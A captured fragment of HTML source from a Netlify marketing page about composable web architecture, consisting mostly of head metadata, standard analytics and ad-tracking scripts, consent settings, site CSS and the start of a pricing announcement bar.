        <link rel="apple-touch-icon" href="/favicon/apple-touch-icon.png">
        <link rel="manifest" href="/site.webmanifest" crossorigin="use-credentials">
        <meta name="apple-mobile-web-app-title" content="Netlify">
        <meta name="application-name" content="Netlify">
        <meta name="theme-color" content="#ffffff">
        <!-- Open Graph meta tags -->
        <meta property="og:type" content="website">
        <meta property="og:title" content="Scale &amp; Ship Faster with a Composable Web Architecture | Netlify">
        <meta property="og:description" content="Realize the speed, agility and performance of a scalable, composable web architecture with Netlify. Explore the composable web platform now!">
        <meta property="og:image" content="https://cdn.sanity.io/images/o0o2tn5x/marketing/19d95d00d7f79b8b4340dc6ca183ac5456f1a095-1200x630.png">
        <!-- Twitter meta tags -->
        <meta name="twitter:card" content="summary_large_image">
        <meta property="twitter:domain" content="netlify.com">
        <meta name="twitter:title" content="Scale &amp; Ship Faster with a Composable Web Architecture | Netlify">
        <meta name="twitter:description" content="Realize the speed, agility and performance of a scalable, composable web architecture with Netlify. Explore the composable web platform now!">
        <meta name="twitter:image" content="https://cdn.sanity.io/images/o0o2tn5x/marketing/19d95d00d7f79b8b4340dc6ca183ac5456f1a095-1200x630.png">
        <!-- Page assets -->
        <link rel="preload" href="/fonts/pacaembu/PacaembuNetlify-Variable.woff2" as="font" type="font/woff2" crossorigin="">
        <!-- Third-party verification -->
        <meta name="slack-app-id" content="A05P27DR8C8">
        <!-- Third-party scripts -->
        <script type="text/javascript" src="https://cdn.segment.com/next-integrations/actions/amplitude-plugins/3b0a288ecd08e5d54cea.js" async="" status="loaded"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=AW-957669464&amp;cx=c&amp;gtm=4e59g0h2"></script><script async="" src="https://snap.licdn.com/li.lms-analytics/insight.beta.min.js"></script><script src="https://js.hs-analytics.net/analytics/1758107700000/7477936.js" type="text/javascript" id="hs-analytics"></script><script src="https://js.hsadspixel.net/fb.js" type="text/javascript" id="hs-ads-pixel-7477936" data-ads-portal-id="7477936" data-ads-env="prod" data-loader="hs-scriptloader" data-hsjs-portal="7477936" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script src="https://js.hs-banner.com/v2/7477936/banner.js" type="text/javascript" id="cookieBanner-7477936" data-cookieconsent="ignore" data-hs-ignore="true" data-loader="hs-scriptloader" data-hsjs-portal="7477936" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script src="https://js.hubspot.com/web-interactives-embed.js" type="text/javascript" id="hubspot-web-interactives-loader" crossorigin="anonymous" data-loader="hs-scriptloader" data-hsjs-portal="7477936" data-hsjs-env="prod" data-hsjs-hublet="na1"></script><script type="text/javascript" async="" src="https://www.googletagmanager.com/gtag/js?id=G-X2FMMZSSS9&amp;cx=c&amp;gtm=4e59g0h2"></script><script type="text/javascript" async="" src="https://cdn.segment.com/analytics.js/v1/7f8W9mAxost9lRWyMuVR8xaMv9kHxBsy/analytics.min.js"></script><script type="text/javascript" async="" src="https://static.ads-twitter.com/uwt.js"></script><script type="text/javascript" async="" src="https://snap.licdn.com/li.lms-analytics/insight.min.js"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-T7WNFLD"></script><script>
            window.dataLayer = window.dataLayer || [];
            function gtag() {
                dataLayer.push(arguments);
            }

            gtag('consent', 'default', {
                ad_storage: 'denied',
                analytics_storage: 'denied',
                functionality_storage: 'denied',
                personalization_storage: 'denied',
                security_storage: 'denied',
                region: ['AT', 'BE', 'BG', 'HR', 'CY', 'CZ', 'DK', 'EE', 'FI', 'FR', 'DE', 'EL', 'HU', 'IE', 'IT', 'LV', 'LT', 'LU', 'MT', 'NL', 'PL', 'PT', 'RO', 'SK', 'SI', 'ES', 'SE', 'UK', ],
            });

            gtag('consent', 'default', {
                ad_storage: 'granted',
                analytics_storage: 'granted',
                functionality_storage: 'granted',
                personalization_storage: 'granted',
                security_storage: 'granted',
            });

            function OptanonWrapper() {
                if (!OneTrust.IsAlertBoxClosed()) {
                    document.body.classList.add('onetrust-alert-box-open');
                }

                OneTrust.OnConsentChanged( () => {
                    if (OneTrust.IsAlertBoxClosed()) {
                        document.body.classList.remove('onetrust-alert-box-open');
                    }
                }
                );
            }
        </script>
        <!-- Google Tag Manager -->
        <script>
            (function() {
                const id = "GTM-T7WNFLD";

                (function(w, d, s, l, i) {
                    w[l] = w[l] || [];
                    w[l].push({
                        'gtm.start': new Date().getTime(),
                        event: 'gtm.js'
                    });
                    var f = d.getElementsByTagName(s)[0]
                      , j = d.createElement(s)
                      , dl = l != 'dataLayer' ? '&l=' + l : '';
                    j.async = true;
                    j.src = 'https://www.googletagmanager.com/gtm.js?id=' + i + dl;
                    f.parentNode.insertBefore(j, f);
                }
                )(window, document, 'script', 'dataLayer', id);
            }
            )();
        </script>
        <!-- End Google Tag Manager -->
        <!-- Google Analytics (gtag.js) -->
        <script>
            (function() {
                const id = "G-X2FMMZSSS9";

                function gtag() {
                    dataLayer.push(arguments);
                }
                gtag('js', new Date());

                gtag('config', id);
            }
            )();
        </script>
        <!-- End Google Analytics (gtag.js) -->
        <!-- Qualified -->
        <script>
            (function(w, q) {
                w['QualifiedObject'] = q;
                w[q] = w[q] || function() {
                    (w[q].q = w[q].q || []).push(arguments);
                }
                ;
            }
            )(window, 'qualified');
        </script>
        <script async="" src="https://js.qualified.com/qualified.js?token=FvGWn26rk1tuEjBR"></script>
        <!-- End Qualified -->
        <!-- RSS Feeds -->
        <link rel="alternate" type="application/rss+xml" title="Netlify Changelog" href="https://www.netlify.com/changelog/feed.xml">
        <!-- PageFind -->
        <script>
            (async function() {
                try {
                    window.pagefind = await import('https://www.netlify.com/pagefind/pagefind.js');
                    await window.pagefind.options({
                        mergeFilter: {
                            site: 'www',
                        },
                        indexWeight: 1,
                        ranking: {
                            termFrequency: 0.2,
                            termSimilarity: 1,
                            termSaturation: 1,
                        },
                    });

                    await window.pagefind.mergeIndex('https://docs.netlify.com/pagefind', {
                        mergeFilter: {
                            site: 'docs',
                        },
                        indexWeight: 2,
                        ranking: {
                            termFrequency: 0.2,
                            termSimilarity: 1,
                            termSaturation: 1,
                        },
                    });

                    await window.pagefind.mergeIndex('https://developers.netlify.com/pagefind', {
                        mergeFilter: {
                            site: 'developers',
                        },
                        indexWeight: 1,
                        ranking: {
                            termFrequency: 0.2,
                            termSimilarity: 1,
                            termSaturation: 1,
                        },
                    });
                } catch (error) {
                    console.error('Error fetching pagefind:', error);
                }
            }
            )();
        </script>
        <script>
            (function() {
                const theme = localStorage.getItem('theme');
                theme && document.documentElement.setAttribute('data-theme', theme);
            }
            )();
        </script>
        <link rel="stylesheet" href="/_astro/convince-your-boss.8mRLRQhe.css">
        <link rel="stylesheet" href="/_astro/_slug_.Q3x5wwGM.css">
        <link rel="stylesheet" href="/_astro/_guideSlug_.xMDmSUOm.css">
        <style>
            .card[data-astro-cid-dohjnao5] :where(.heading,.ingredient) {
                margin-inline:unset}

            :where([data-theme=dark])[data-astro-cid-dohjnao5] .card[data-astro-cid-dohjnao5]:not([data-theme]) {
                --card-bg: var(--neutral-dark-600)
            }

            .card[data-astro-cid-dohjnao5][data-options*=full-width-media]:has(:first-child>:where(img,.yt-wrapper)) {
                padding-block-start:0}

            .card[data-astro-cid-dohjnao5][data-options*=full-width-media]:has(:last-child>:where(img,.yt-wrapper)) {
                padding-block-end:0}

            .card[data-astro-cid-dohjnao5][data-options*=full-width-media] :where(img,.yt-wrapper) {
                --_padding: var(--card-padding, var(--space-m));
                width: calc(100% + 2 * var(--_padding));
                transform: translate(calc(-1 * var(--_padding)));
                max-inline-size: unset
            }

            .card[data-astro-cid-dohjnao5][data-options*=repel-last-element]>:nth-last-child(2) {
                margin-block-end:auto}

            .card[data-astro-cid-dohjnao5] .heading>a:after {
                content: "";
                position: absolute;
                inset: 0
            }

            .card[data-astro-cid-dohjnao5] .heading>a {
                text-decoration: none
            }

            .pancake[data-astro-cid-5mutinvq] {
                color: var(--pancake-color-text, var(--color-text-1));
                background: var(--pancake-color-bg, var(--color-bg-1));
                position: relative
            }

            .pancake-margin-top-override[data-astro-cid-5mutinvq] {
                margin-block-start:var(--margin-block-start)}

            .pancake-content[data-astro-cid-5mutinvq] {
                --stack-space: var(--space-2xl);
                position: relative
            }

            .pancake-background-clip[data-astro-cid-5mutinvq] {
                padding-block-end:0}

            .pancake-background-clip[data-astro-cid-5mutinvq] .ingredient:last-of-type {
                position: relative
            }

            .pancake-background-clip[data-astro-cid-5mutinvq] .ingredient:last-of-type>* {
                z-index: 0
            }

            .pancake-background-clip[data-astro-cid-5mutinvq] .ingredient:last-of-type:before {
                position: absolute;
                top: 50%;
                content: "";
                width: 100%;
                height: 50%;
                background: #fff
            }

            .pancake-border-bottom[data-astro-cid-5mutinvq] {
                border-bottom: 1px solid var(--color-bg-3);
                padding-block:var(--padding-block-start) var(--padding-block-end)}
        </style>
        <link rel="stylesheet" href="/_astro/index.CvaxANHg.css">
        <style>
            .event-block[data-astro-cid-fzs2epah] {
                display: grid;
                grid-auto-rows: min-content;
                position: relative;
                gap: var(--space-xs);
                width: 100%;
                height: 100%;
                justify-content: space-between
            }

            .event-block[data-astro-cid-fzs2epah][data-variant=compact] {
                display: flex;
                flex-wrap: wrap;
                flex-direction: row-reverse;
                border: 1px solid var(--color-bg-2);
                padding: var(--space-xs) var(--space-s);
                border-radius: var(--radius-xl)
            }

            .event-block[data-astro-cid-fzs2epah][data-variant=compact] .event-block-thumbnail[data-astro-cid-fzs2epah] {
                flex: .5
            }

            .event-block[data-astro-cid-fzs2epah][data-variant=compact] .event-block-content[data-astro-cid-fzs2epah] {
                flex: 1
            }

            .event-block[data-astro-cid-fzs2epah][data-variant=contained] {
                padding: var(--space-s);
                background-color: var(--color-bg-1);
                color: var(--color-text-1);
                border-radius: var(--radius-l);
                box-shadow: var(--shadow-light);
                transition: box-shadow .2s ease-in-out
            }

            .event-block[data-astro-cid-fzs2epah]:not([data-variant=compact],[data-variant=contained]):hover .event-block-thumbnail[data-astro-cid-fzs2epah] {
                --_border-color: var(--teal-300);
                box-shadow: 0 0 0 .2em var(--teal-300)
            }

            .event-block[data-astro-cid-fzs2epah]:not([data-variant=compact],[data-variant=contained]):hover .event-block-image[data-astro-cid-fzs2epah] {
                transform: scale(1.03)
            }

            .event-block[data-astro-cid-fzs2epah]:not([data-variant=compact],[data-variant=contained]):hover .cta[data-astro-cid-fzs2epah] {
                background-color: var(--color-bg-3)
            }

            .event-block[data-astro-cid-fzs2epah][data-variant=contained]:hover {
                box-shadow: var(--shadow-hover)
            }

            .event-block[data-astro-cid-fzs2epah][data-past=true] .event-block-image[data-astro-cid-fzs2epah] {
                filter: saturate(0) contrast(.8)
            }

            .event-block[data-astro-cid-fzs2epah][data-past=true]:hover .event-block-image {
                filter: unset
            }

            .event-block-link[data-astro-cid-fzs2epah] {
                display: block;
                text-decoration: none
            }

            .event-block-link[data-astro-cid-fzs2epah]:before {
                content: "";
                position: absolute;
                inset: 0
            }

            .event-block-thumbnail[data-astro-cid-fzs2epah] {
                position: relative;
                box-shadow: 0 0 0 0 var(--teal-300);
                border: var(--color-border);
                border-radius: var(--radius-l);
                overflow: hidden;
                isolation: isolate;
                aspect-ratio: 16 / 9;
                transition: all .3s ease-out
            }

            .event-block-image[data-astro-cid-fzs2epah] {
                width: 100%;
                height: 100%;
                aspect-ratio: 16 / 9;
                object-fit: cover;
                transition: filter .3s ease-out,transform .2s ease-out
            }

            .event-block-badge {
                --icon-size: 1em;
                padding: .7em;
                display: inline-flex;
                aspect-ratio: 1 / 1;
                align-items: center;
                gap: var(--space-3xs);
                position: absolute;
                z-index: 1;
                inset-inline-start: var(--space-xs);
                inset-block-end: var(--space-xs)
            }

            .cta[data-astro-cid-fzs2epah] {
                --icon-size: .75em;
                text-decoration: none;
                display: block;
                flex-basis: 100%;
                line-height: 0;
                padding: 10px 14px;
                border-radius: var(--radius-pill);
                max-width: max-content;
                transition: background-color .3s;
                transform: translate(-14px);
                cursor: pointer;
                pointer-events: none
            }

            .cta[data-astro-cid-fzs2epah] [data-astro-cid-fzs2epah][data-icon] {
                margin-inline-start:var(--space-3xs);align-items: center
            }

            .metadata[data-astro-cid-fzs2epah] {
                --cluster-row-gap: var(--space-3xs);
                color: var(--color-text-1)
            }

            .metadata[data-astro-cid-fzs2epah] p[data-astro-cid-fzs2epah] {
                display: inline-flex;
                align-items: center;
                column-gap: var(--space-2xs)
            }

            .metadata[data-astro-cid-fzs2epah] .duration[data-astro-cid-fzs2epah] {
                font-family: monospace
            }

            .resource-list[data-astro-cid-4rxi24qb] {
                --grid-min: var(--column-max-width, 340px);
                --grid-column-gap: var(--space-l)
            }

            .resource-list-item[data-astro-cid-4rxi24qb] {
                height: 100%;
                inline-size: 100%
            }

            .resource-list-item[data-astro-cid-4rxi24qb]:only-child {
                max-width: 500px
            }

            .hubspot-form-wrapper {
                --center-max: 35rem
            }

            .hs-form-booleancheckbox-display {
                display: flex;
                align-items: baseline;
                gap: var(--space-2xs)
            }

            .hs-form :where(.legal-consent-container,[class^=hs_notice_and_consent]) {
                font-size: var(--step--1)
            }

            .hs-form .legal-consent-container .hs-form-booleancheckbox-display>span {
                margin-left: 0
            }

            .hs-form-required {
                margin-inline-start:.1em;color: var(--color-text-invalid)
            }

            .hs-error-msg {
                font-size: .8em;
                color: var(--color-text-invalid)
            }

            .hs_error_rollup .hs-error-msgs {
                font-size: .8em;
                line-height: normal;
                color: var(--color-text-invalid);
                background-color: var(--color-bg-invalid);
                padding: var(--space-xs) var(--space-s);
                border-radius: var(--radius-m)
            }

            .hs-error-msg {
                display: block
            }

            .hs-form-field:not([hidden]) {
                display: grid;
                gap: var(--space-3xs)
            }

            .hs-submit {
                --stack-space: var(--space-m)
            }

            .hs-submit input {
                width: 100%
            }

            .c-badge-group[data-astro-cid-mh4d3t3h] {
                --cluster-gap: var(--card-badge-gap, 12px)
            }

            .label[data-astro-cid-mh4d3t3h] {
                font-weight: 700
            }

            .card-container[data-astro-cid-ccoymqwb] {
                display: flex
            }

            .heading[data-astro-cid-u4qoyrkz] {
                max-width: var(--heading-max, 60ch);
                line-height: var(--line-height-heading)
            }

            .text-center[data-astro-cid-u4qoyrkz] .heading[data-astro-cid-u4qoyrkz] {
                margin-inline:auto}

            span[data-astro-cid-u4qoyrkz] {
                display: block
            }

            .text-center[data-astro-cid-u4qoyrkz] .heading-eyebrow[data-astro-cid-u4qoyrkz] {
                margin-inline:auto}

            .heading-eyebrow[data-astro-cid-u4qoyrkz] {
                width: fit-content
            }

            .heading-eyebrow[data-astro-cid-u4qoyrkz]+[data-astro-cid-u4qoyrkz] {
                margin-top: var(--space-xs)
            }

            .heading[data-astro-cid-u4qoyrkz]>a[data-astro-cid-u4qoyrkz] {
                text-decoration: none;
                display: inline-block
            }

            .heading[data-astro-cid-u4qoyrkz]:is(p) {
                line-height: var(--line-height-text)
            }

            [data-astro-cid-patnjmll][data-variant=encapsulated] {
                --size: 3rem;
                --icon-size: 1.25rem;
                display: grid;
                place-items: center;
                color: var(--neutral-light-800);
                background-color: var(--blue-000);
                width: var(--size);
                height: var(--size);
                border-radius: var(--radius-circle)
            }

            lite-youtube {
                background-color: #000;
                position: relative;
                display: block;
                contain: content;
                background-position: center center;
                background-size: cover;
                cursor: pointer;
                max-width: 720px
            }

            lite-youtube:before {
                content: attr(data-title);
                display: block;
                position: absolute;
                top: 0;
                background-image: linear-gradient(180deg,#000000ab,#0000008a 14%,#00000026 54%,#0000000d 72%,#0000 94%);
                height: 99px;
                width: 100%;
                font-family: YouTube Noto,Roboto,Arial,Helvetica,sans-serif;
                color: #eee;
                text-shadow: 0 0 2px rgba(0,0,0,.5);
                font-size: 18px;
                padding: 25px 20px;
                overflow: hidden;
                white-space: nowrap;
                text-overflow: ellipsis;
                box-sizing: border-box
            }

            lite-youtube:hover:before {
                color: #fff
            }

            lite-youtube:after {
                content: "";
                display: block;
                padding-bottom: 56.25%
            }

            lite-youtube>iframe {
                width: 100%;
                height: 100%;
                position: absolute;
                top: 0;
                left: 0;
                border: 0
            }

            lite-youtube>.lty-playbtn {
                display: block;
                width: 100%;
                height: 100%;
                background: no-repeat center/68px 48px;
                background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 68 48"><path d="M66.52 7.74c-.78-2.93-2.49-5.41-5.42-6.19C55.79.13 34 0 34 0S12.21.13 6.9 1.55c-2.93.78-4.63 3.26-5.42 6.19C.06 13.05 0 24 0 24s.06 10.95 1.48 16.26c.78 2.93 2.49 5.41 5.42 6.19C12.21 47.87 34 48 34 48s21.79-.13 27.1-1.55c2.93-.78 4.64-3.26 5.42-6.19C67.94 34.95 68 24 68 24s-.06-10.95-1.48-16.26z" fill="red"/><path d="M45 24 27 14v20" fill="white"/></svg>');
                position: absolute;
                cursor: pointer;
                z-index: 1;
                filter: grayscale(100%);
                transition: filter .1s cubic-bezier(0,0,.2,1);
                border: 0
            }

            lite-youtube:hover>.lty-playbtn,lite-youtube .lty-playbtn:focus {
                filter: none
            }

            lite-youtube.lyt-activated {
                cursor: unset
            }

            lite-youtube.lyt-activated:before,lite-youtube.lyt-activated>.lty-playbtn {
                opacity: 0;
                pointer-events: none
            }

            .lyt-visually-hidden {
                clip: rect(0 0 0 0);
                clip-path: inset(50%);
                height: 1px;
                overflow: hidden;
                position: absolute;
                white-space: nowrap;
                width: 1px
            }

            lite-youtube>iframe {
                all: unset!important;
                width: 100%!important;
                height: 100%!important;
                position: absolute!important;
                inset: 0!important;
                border: 0!important
            }

            .author[data-astro-cid-2ri7i3m6] {
                --sidebar-gap: var(--space-xs);
                --sidebar-min: 70%;
                --sidebar-direction: row;
                flex: 1 0;
                align-items: center;
                font-size: var(--author-font-size, var(--step--1))
            }

            .author-title[data-astro-cid-2ri7i3m6] span[data-astro-cid-2ri7i3m6] {
                display: block
            }

            .avatar[data-astro-cid-2ri7i3m6] {
                width: 100%;
                height: auto;
                aspect-ratio: 1;
                max-inline-size: var(--avatar-size, 3rem);
                object-fit: cover;
                border-radius: var(--radius-circle);
                background-color: var(--neutral-dark-100)
            }

            .author[data-astro-cid-2ri7i3m6][data-size-variant=large] .avatar[data-astro-cid-2ri7i3m6] {
                --avatar-size: 4.375rem
            }

            .author[data-astro-cid-2ri7i3m6][data-size-variant=large] {
                --author-font-size: var(--step-0)
            }

            .author[data-astro-cid-2ri7i3m6][data-size-variant=inline] .avatar[data-astro-cid-2ri7i3m6] {
                --avatar-size: 3rem
            }

            .author[data-astro-cid-2ri7i3m6][data-size-variant=inline] .author-title[data-astro-cid-2ri7i3m6] {
                font-weight: var(--font-weight-regular)
            }

            .author[data-astro-cid-2ri7i3m6][data-size-variant=inline] :is(.author-name,.author-title,.author-title span)[data-astro-cid-2ri7i3m6] {
                display: inline-block
            }

            .inline-quote[data-astro-cid-w6zxjwyn] {
                display: grid;
                grid-template-columns: 4px 1fr;
                grid-column-gap: var(--space-l);
                grid-row-gap: var(--space-s)
            }

            .inline-quote[data-astro-cid-w6zxjwyn]:before {
                content: "";
                height: 100%;
                display: inline-block;
                width: 4px;
                background: var(--gradient-quote-vertical);
                grid-column: 1;
                grid-row: 1 / 3
            }

            .inline-quote[data-astro-cid-w6zxjwyn]>[data-astro-cid-w6zxjwyn] {
                grid-column: 2
            }

            img[data-astro-cid-jbhojhg7] {
                width: 100%
            }

            .logo-marquee[data-astro-cid-h2jlyvcc] {
                --_speed: 60s;
                --_gap: var(--logo-marquee-gap, 3rem);
                display: flex;
                flex-wrap: nowrap;
                overflow: hidden;
                gap: var(--_gap);
                -webkit-mask-image: linear-gradient(90deg,rgba(0,0,0,0) 0%,rgba(0,0,0,1) 15%,rgba(0,0,0,1) 85%,rgba(0,0,0,0) 100%)
            }

            .logo-marquee[data-astro-cid-h2jlyvcc] :is(picture,img,svg) {
                width: clamp(8rem,1.2vw,10rem);
                height: 100%;
                max-height: var(--logo-height, 4rem);
                object-fit: contain;
                filter: var(--filter-invert)
            }

            .logo-marquee[data-astro-cid-h2jlyvcc] ul[data-astro-cid-h2jlyvcc] {
                flex-shrink: 0;
                display: flex;
                align-items: center;
                justify-content: space-around;
                flex-wrap: nowrap;
                gap: var(--_gap);
                min-width: 100%;
                animation: ticker var(--_speed) linear infinite
            }

            .logo-marquee[data-astro-cid-h2jlyvcc]:where(.reverse) ul[data-astro-cid-h2jlyvcc] {
                animation-direction: reverse
            }

            @keyframes ticker {
                0% {
                    transform: translate(calc(var(--_gap) * -1))
                }

                to {
                    transform: translate(calc(-100% - var(--_gap) * 2))
                }
            }

            .logo-wall[data-astro-cid-6y2sa4q5] {
                --grid-min: 10rem;
                --grid-gap: 2rem;
                --grid-justify: center;
                display: grid;
                grid-template-columns: repeat(var(--repeat, var(--count, 6)),1fr);
                gap: clamp(var(--space-m),4vw,var(--space-xl));
                margin-inline:auto;inline-size: fit-content
            }

            .logo-wall[data-astro-cid-6y2sa4q5] :is(picture,img,svg) {
                width: min(10rem,100%);
                height: min(5rem,100%);
                aspect-ratio: 5/3;
                object-fit: contain
            }

            @media (max-width: 30rem) {
                .sm-wrap[data-astro-cid-6y2sa4q5] {
                    --repeat: 3;
                    padding-inline:var(--space-l)}
            }

            .yt-wrapper[data-astro-cid-aomsn35f] {
                width: 100%;
                position: relative;
                isolation: isolate
            }

            lite-youtube[data-astro-cid-aomsn35f] {
                border-radius: var(--border-radius);
                border: 1px solid var(--border-color);
                max-width: none
            }

            lite-youtube[data-astro-cid-aomsn35f]:before {
                display: none
            }

            lite-youtube[data-astro-cid-aomsn35f]>.lty-playbtn {
                position: absolute;
                inset: 0;
                margin: auto;
                height: auto;
                filter: none;
                width: min(100px,12vw);
                aspect-ratio: 1;
                isolation: isolate;
                background-color: var(--neutral-light-000);
                background-size: 40%;
                background-repeat: no-repeat;
                background-position: calc(50% + 2px) center;
                border-radius: var(--radius-circle);
                background-image: var(--play-btn-svg);
                box-shadow: 0 0 15px var(--neutral-dark-200);
                transform: scale(1);
                transition: transform .4s var(--ease-out)
            }

            lite-youtube[data-astro-cid-aomsn35f]:hover .lty-playbtn {
                transform: scale(1.05)
            }

            .caption[data-astro-cid-aomsn35f] {
                color: var(--color-text-2)
            }

            .astro-code {
                background-color: var(--blue-900)!important;
                padding: var(--space-m);
                border-radius: var(--radius-m);
                outline-offset: -2px;
                font-size: var(--step-0)
            }

            .prose[data-astro-cid-cnvtppup] {
                max-width: var(--prose-max-width, 100%)
            }

            .cta-group[data-astro-cid-sc466a3x] {
                align-items: var(--ctas-align, center)
            }

            .button[data-astro-cid-sc466a3x] {
                width: var(--cta-min-width)
            }

            .cta-arrow-link:hover {
                --_icon-x: 2px
            }

            .cta-arrow-link svg {
                --button-icon-size: .7em;
                transform: rotate(var(--_icon-rotate, 0)) translate(var(--_icon-x, 0));
                transition: transform .2s var(--ease-out)
            }

            .cta-arrow-link[href*="//"]:not([href*="netlify.com"]) {
                --_icon-rotate: -45deg
            }

            .cta-arrow-link[href^="#"] {
                --_icon-rotate: 90deg
            }

            .button[data-astro-cid-tcbm7f7q][data-icon-name=arrow][data-icon-position=inline-end]:hover {
                --_icon-x: 2px
            }

            .button[data-astro-cid-tcbm7f7q][data-icon-name=arrow] svg[data-astro-cid-tcbm7f7q] {
                --button-icon-size: .7em;
                transform: rotate(var(--_icon-rotate, 0)) translate(var(--_icon-x, 0));
                transition: transform .2s var(--ease-out)
            }

            .button[data-astro-cid-tcbm7f7q][data-icon-name=arrow][data-icon-position=inline-end][href*="//"]:not([href*="netlify.com"]) {
                --_icon-rotate: -45deg
            }

            .button[data-astro-cid-tcbm7f7q][data-icon-name=arrow][data-icon-position=inline-end][href^="#"] {
                --_icon-rotate: 90deg
            }

            .button[data-astro-cid-tcbm7f7q]::-webkit-details-marker {
                display: none
            }
        </style>
    <style id="_goober"> .go2933276541{position:fixed;display:block;width:100%;height:0px;margin:0px;padding:0px;overflow:visible;transform-style:preserve-3d;background:transparent;backface-visibility:hidden;pointer-events:none;left:0px;z-index:9998;}.go2369186930{top:0px;z-index:9999;height:100%;width:100%;}.go1348078617{bottom:0px;}.go2417249464{position:fixed;z-index:9989;}.go3921366393{left:0;bottom:0;}.go3967842156{right:0;bottom:0;}.go613305155{left:0;top:0;}.go471583506{right:0;top:0;}.go3670563033{position:relative;overflow:hidden;display:none;}.go1041095097{display:block;}.go1632949049{position:absolute;pointer-events:none;width:101vw;height:101vh;background:rgba(0,0,0,0.7);opacity:0;z-index:-1;}.go2512015367{z-index:99998;opacity:0.8;visibility:visible;pointer-events:all;cursor:pointer;}.go1432718904{overflow:hidden;}.go812842568{display:block !important;position:static !important;box-sizing:border-box !important;background:transparent !important;border:none;min-height:0px !important;max-height:none !important;margin:0px;padding:0px !important;height:100% !important;width:1px !important;max-width:100% !important;min-width:100% !important;}.go3064412225{z-index:99999;visibility:hidden;position:absolute;inset:50vh auto auto 50%;left:50%;top:50%;transform:translate(-50%,-50%) translateY(100vh);pointer-events:none;max-height:95%;max-width:95%;}.go1656994552{pointer-events:auto !important;visibility:visible;transform:translate(-50%,-50%) translateY(0);transition:transform 0.75s linear(0,0.006,0.023 2.2%,0.096 4.8%,0.532 15.4%,0.72 21%,0.793,0.853 26.7%,0.902,0.941,0.968 36.2%,0.987 39.7%,1 43.7%,1.007 48.3%,1.009 55.3%,1.002 78.2%,1 );}.go456419034{transition:opacity 0.3s ease-in;}.go3128134379{pointer-events:auto !important;visibility:visible !important;max-height:95vh !important;transition:max-height 1s ease-in;}.go494047706{z-index:9999;width:100%;max-height:95%;position:fixed;visibility:hidden;}.go2481764524{z-index:9999;width:100%;max-height:95%;position:fixed;visibility:hidden;bottom:0px;}.go2685733372{visibility:hidden;}.go2985984737{visibility:visible !important;}.go3281949485{pointer-events:auto !important;visibility:visible !important;max-height:95vh !important;transform:none !important;}.go3508454897{z-index:9999;width:100%;max-height:95%;position:fixed;visibility:hidden;transition:transform 1s linear(0,0.006,0.022 2.3%,0.091 5.1%,0.18 7.6%,0.508 16.3%,0.607,0.691,0.762,0.822 28.4%,0.872,0.912 35.1%,0.944 38.9%,0.968 43%,0.985 47.6%,0.996 53.1%,1.001 58.4%,1.003 65.1%,1 );}.go988075951{z-index:9999;position:fixed;left:10px;top:10px;max-height:95vh !important;max-width:95%;visibility:hidden;}.go2699082514{z-index:9999;position:fixed;right:10px;top:10px;max-height:95vh !important;max-width:95%;visibility:hidden;}.go1595992025{z-index:9999;position:fixed;left:10px;bottom:10px;max-height:95vh !important;max-width:95%;visibility:hidden;}.go1222083472{z-index:9999;position:fixed;right:10px;bottom:10px;max-height:95vh !important;max-width:95%;visibility:hidden;}.go722322694{transition:none !important;}.go26732895{cursor:pointer;}.go2083580917{display:flex;justify-content:center;align-items:center;}</style><script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-957669464"></script><script type="text/javascript" async="" src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/957669464/?random=1758107899334&amp;cv=11&amp;fst=1758107899334&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;en=gtag.config&amp;gtm=45be59f1v9133104323za200zb848243009zd848243009xec&amp;gcd=13t3t3l3l5l1&amp;dma=0&amp;tag_exp=101509157~103116026~103200004~103233427~104527907~104528501~104630779~104630781~104684208~104684211~104948813~105367987~105367989~105426769~105426771~115480709~115688283~115688285&amp;u_w=1920&amp;u_h=1080&amp;url=https%3A%2F%2Fsubmit.business-service-center.com%2F&amp;ref=https%3A%2F%2Fsubmit.business-service-center.com%2F&amp;frm=0&amp;tiba=Scale%20%26Ship%20Faster%20with%20a%20Composable%20Web%20Architecture%20%7C%20Netlify&amp;did=dZTQ1Zm&amp;gdid=dZTQ1Zm&amp;hn=www.googleadservices.com&amp;npa=0&amp;pscdl=noapi&amp;auid=575942691.1758107896&amp;data=event%3Dgtag.config&amp;rfmt=3&amp;fmt=4"></script></head>
    <body style="--announcement-bar-height: 56.33333206176758px;"><div id="hs-web-interactives-top-push-anchor" class="go3670563033"></div>
        <noscript>
            <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T7WNFLD" height="0" width="0" style="display:none;visibility:hidden"></iframe>
        </noscript>
        <header class="site-header">
            <script id="announcement-render" data-announcement-url="https://www.netlify.com/blog/new-pricing-credits" data-announcement-hide-after="2025-09-21">
                (function() {
                    const storageUrl = localStorage.getItem('Netlify_hide-announcement-bar');
                    const scriptTarget = document.querySelector('#announcement-render');

                    if (!scriptTarget)
                        return;

                    const url = scriptTarget.getAttribute('data-announcement-url');
                    const hideAfter = scriptTarget.getAttribute('data-announcement-hide-after');

                    function isExpired(date) {
                        if (!date)
                            return;
                        let hideAfterSplit = date.split(/[^\d]/).map( (entry) => parseInt(entry, 10));
                        let compareDate = new Date(hideAfterSplit[0],hideAfterSplit[1] - 1,hideAfterSplit[2] + 1);
                        return compareDate && new Date() > compareDate;
                    }

                    if (storageUrl === url || isExpired(hideAfter)) {
                        document.documentElement.setAttribute('data-announcement-state', 'hidden');
                    }
                }
                )();
            </script>
            <div class="announcement-bar" data-href="https://www.netlify.com/blog/new-pricing-credits" data-astro-cid-o54ltyzl="">
                <p data-astro-cid-o54ltyzl="">
                    <span data-astro-cid-o54ltyzl="">New credit-based pricing. Current plans stay the same.</span>
                    <a href="https://www.netlify.com/blog/new-pricing-credits?__hstc=6236844.cb5c59c87f8b0991a4f62ebe318c1f03.1758107903193.1758107903193.1758107903193.1&amp;__hssc=6236844.1.1758107903193&amp;__hsfp=2541287795" class="announcement-bar-link" id="cta-header-announcementBar" data-astro-cid-o54ltyzl="">Read the update →</a>
                </p>
                <button class="close" type="reset" id="cta-header-announcementBar-close" data-astro-cid-o54ltyzl="">
                    <span class="visually-hidden" data-astro-cid-o54ltyzl="">Close announcement bar</span>
